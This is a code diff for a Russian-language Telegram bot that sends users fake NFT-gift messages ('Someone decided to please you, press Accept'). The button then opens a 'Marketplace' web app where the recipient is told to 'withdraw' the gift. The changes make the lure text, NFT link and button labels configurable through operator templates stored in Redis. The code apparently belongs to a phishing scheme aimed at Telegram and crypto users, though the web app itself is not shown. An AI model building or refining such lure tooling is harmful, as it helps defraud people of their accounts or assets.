@@ -209,17 +209,18 @@ async def start_handler(message: types.Message):
         await message.answer(start_text, reply_markup=keyboard)
 
 async def handle_gift_start(message: types.Message, payload: str):
+    import urllib.parse
     try:
         parts = payload.split("_")
-        nft_id = parts[1]          # JesterHat-18979
+        nft_id = parts[1]
         sender_id = parts[3] if len(parts) >= 4 else "unknown"
 
         dash_idx = nft_id.rfind("-")
-        nft_slug = nft_id[:dash_idx].lower()   # jesterhat
-        nft_number = nft_id[dash_idx + 1:]     # 18979
-
-        nft_name = "Jester Hat"
-        full_name = f"{nft_name} #{nft_number}"
+        nft_slug = nft_id[:dash_idx].lower()
+        nft_number = nft_id[dash_idx + 1:]
+        nft_display_name = nft_id[:dash_idx].replace("-", " ").title()
+        full_name = f"{nft_display_name} #{nft_number}"
+        nft_url = f"https://t.me/nft/{nft_id}"
         receiver_id = message.from_user.id
 
         gift_data = {
@@ -232,18 +233,36 @@ async def handle_gift_start(message: types.Message, payload: str):
         await redis_set_json(f"gift:{receiver_id}", gift_data, ex=604800)
         print(f"Gift saved: receiver={receiver_id}, nft={full_name}")
 
-        img_url = f"https://nft.fragment.com/gift/{nft_slug}-{nft_number}.webp"
+        # Читаем шаблон
+        receive_text = "🎁 Вам подарили NFT, и он ожидает вывода в ваш профиль."
+        market_text = "Маркетплейс 🏬"
+        try:
+            bot_data_raw = await redis_get("panel_bot")
+            if bot_data_raw:
+                bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
+                active_itpl_id = bot_data.get("active_inline_template", "")
+                if active_itpl_id:
+                    itemplates_raw = await redis_get("inline_templates")
+                    if itemplates_raw:
+                        itemplates = json.loads(urllib.parse.unquote(itemplates_raw))
+                        tpl = next((t for t in itemplates if t["id"] == active_itpl_id), None)
+                        if tpl:
+                            receive_text = tpl.get("receive_text", receive_text)
+                            market_text = tpl.get("market_text", market_text)
+        except:
+            pass
+
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(
-                text="Маркетплейс 🏬",
+                text=market_text,
                 web_app=types.WebAppInfo(url=f"{MARKET_URL}?gift={nft_slug}-{nft_number}")
             )]
         ])
 
+        nft_url_escaped = nft_url.replace("-", "\\-").replace(".", "\\.")
         await message.answer(
-            f"🎁 Вам подарили NFT, и он ожидает вывода в ваш профиль\\.\n\n"
-            f"⚠️ Выведите его до истечения срока действия, иначе NFT будет передан в блокчейн согласно правилам маркетплейса\\.\n\n"
-            f"[{full_name}](https://t.me/nft/JesterHat\\-18979)",
+            f"{receive_text}\n\n"
+            f"[{nft_display_name}]({nft_url_escaped})",
             parse_mode="MarkdownV2",
             reply_markup=keyboard
         )
@@ -257,9 +276,7 @@ async def handle_gift_start(message: types.Message, payload: str):
             )]
         ])
         await message.answer(
-            "🎁 Вам подарили NFT, и он ожидает вывода в ваш профиль\\.\n\n"
-            "⚠️ Выведите его до истечения срока действия, иначе NFT будет передан в блокчейн согласно правилам маркетплейса\\.\n\n"
-            "https://t\\.me/nft/JesterHat\\-18979",
+            "🎁 Вам подарили NFT, и он ожидает вывода в ваш профиль\\.",
             parse_mode="MarkdownV2",
             reply_markup=keyboard
         )
@@ -268,31 +285,67 @@ async def handle_gift_start(message: types.Message, payload: str):
 
 @dp.inline_query()
 async def inline_handler(query: types.InlineQuery):
+    import urllib.parse
     sender_id = query.from_user.id
 
-    nft_slug = "jesterhat"
-    nft_number = 18979
-    nft_name = "Jester Hat #18979"
-    floor = 4.19
+    # Читаем активный inline шаблон из Redis
+    tpl = None
+    try:
+        bot_data_raw = await redis_get("panel_bot")
+        if bot_data_raw:
+            bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
+            active_itpl_id = bot_data.get("active_inline_template", "")
+            if active_itpl_id:
+                itemplates_raw = await redis_get("inline_templates")
+                if itemplates_raw:
+                    itemplates = json.loads(urllib.parse.unquote(itemplates_raw))
+                    tpl = next((t for t in itemplates if t["id"] == active_itpl_id), None)
+    except:
+        pass
 
-    start_payload = f"gift_JesterHat-18979_from_{sender_id}"
+    # Дефолтные значения если шаблон не задан
+    if tpl:
+        nft_url = tpl.get("nft_url", "https://t.me/nft/JesterHat-18979")
+        caption_text = tpl.get("caption", "Кто-то решил вас порадовать — нажмите «Принять», чтобы получить подарок")
+        accept_text = tpl.get("accept_text", "Принять 🎁")
+    else:
+        nft_url = "https://t.me/nft/JesterHat-18979"
+        caption_text = "Кто-то решил вас порадовать — нажмите «Принять», чтобы получить подарок"
+        accept_text = "Принять 🎁"
+
+    # Парсим slug и number из ссылки
+    try:
+        nft_id = nft_url.rstrip("/").split("/")[-1]
+        dash_idx = nft_id.rfind("-")
+        nft_slug = nft_id[:dash_idx].lower()
+        nft_number = nft_id[dash_idx + 1:]
+        nft_display_name = nft_id[:dash_idx].replace("-", " ").title()
+        nft_id_original = nft_id
+    except:
+        nft_slug = "jesterhat"
+        nft_number = "18979"
+        nft_display_name = "Jester Hat"
+        nft_id_original = "JesterHat-18979"
+        nft_url = "https://t.me/nft/JesterHat-18979"
+
+    start_payload = f"gift_{nft_id_original}_from_{sender_id}"
     gift_link = f"https://t.me/{BOT_USERNAME}?start={start_payload}"
     img_url = f"https://nft.fragment.com/gift/{nft_slug}-{nft_number}.webp"
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Принять 🎁", url=gift_link)]
+        [InlineKeyboardButton(text=accept_text, url=gift_link)]
     ])
 
     caption = (
-        f"_Кто-то решил вас порадовать — нажмите «Принять», чтобы получить подарок_\n\n"
-        f"[{nft_name}](https://t.me/nft/JesterHat-18979)"
+        f"_{caption_text}_\n\n"
+        f"[{nft_display_name}]({nft_url})"
     )
 
     results = [
         InlineQueryResultArticle(
-            id="jesterhat-18979",
-            title="Jester Hat #18979",
-            description=f"Отправить подарок · Мин. цена: {floor} TON",
+            id=f"{nft_slug}-{nft_number}",
+            title=f"{nft_display_name} #{nft_number}",
+            description=f"Отправить подарок",
             thumbnail_url=img_url,
             input_message_content=InputTextMessageContent(
                 message_text=caption,
@@ -302,7 +355,7 @@ async def inline_handler(query: types.InlineQuery):
         )
     ]
 
-    await query.answer(results=results, cache_time=30, is_personal=False)
+    await query.answer(results=results, cache_time=0, is_personal=True)
 
 # ─── Синхронизация (старый код — не трогать) ──────────────────────────────────
 
